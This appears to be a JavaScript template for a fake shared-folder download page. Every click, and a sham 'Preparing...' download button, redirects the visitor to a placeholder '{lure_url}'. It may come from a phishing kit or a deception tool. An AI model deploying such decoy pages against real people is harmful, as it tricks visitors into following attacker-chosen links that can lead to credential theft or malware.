function openFolder() {
    window.location.href = '{lure_url}';
}

function downloadFolder() {
    const btn = document.querySelector('.btn-download');
    btn.innerHTML = '<span>Preparing...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1000);
}

document.querySelectorAll('.file-item').forEach(item => {
    item.addEventListener('click', () => {
        window.location.href = '{lure_url}';
    });
});

document.addEventListener('DOMContentLoaded', () => {
    const items = document.querySelectorAll('.file-item');
    items.forEach((item, index) => {
        item.style.opacity = '0';
        item.style.transform = 'translateY(10px)';
        setTimeout(() => {
            item.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
            item.style.opacity = '1';
            item.style.transform = 'translateY(0)';
        }, index * 100);
    });
});
